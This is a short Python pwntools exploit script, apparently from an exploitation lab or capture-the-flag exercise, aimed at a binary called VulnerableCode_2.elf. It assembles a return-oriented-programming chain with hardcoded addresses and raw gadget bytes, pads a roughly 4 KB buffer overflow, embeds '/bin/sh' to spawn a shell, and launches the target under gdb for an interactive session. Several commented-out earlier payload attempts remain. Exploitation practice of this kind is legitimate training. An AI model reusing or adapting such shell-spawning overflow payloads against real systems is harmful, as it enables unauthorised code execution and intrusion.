from pwn import *
import tempfile

rop = ROP('./VulnerableCode_2.elf')

f = open("global.bin", "wb")
#f.write(p32(0x565565bf) + cyclic(4136-4) + p32(0x56559060))
#f.write(p32(0x565565bf) + cyclic(3964) + p32(0x56559060))
#f.write(p32(0x5655563f) + cyclic(4136-4) + p32(0x56559060))
rop.call(0x56559064)
#rop.raw(p32(0x56559060+4))
#rop.raw(p32(0x56559060+4))
payload = str(rop) + 'ht\x90UV' + 'ht\x90UV' + 'hp`UV\xc3'
#f.write(p32(0x5655550f) + cyclic(4136-4) + p32(0x56559060))
#f.write(p32(0x565565bf) + payload + cyclic(4136-4-len(payload)) + p32(0x56559060))
f.write(payload + '/bin/sh\x00' + cyclic(4136-len(payload)-8) + p32(0x56559060))
f.close()

p = gdb.debug(["./VulnerableCode_2.elf", "4", "1", "6", "global.bin"],
        '''
        b *0x565567cd
        set follow-fork-mode parent
        '''
)

#p = process(argv=["./VulnerableCode_2.elf", "4", "1", "6", "/bin/sh", "global.bin"], aslr=False)

p.recv()
p.interactive()
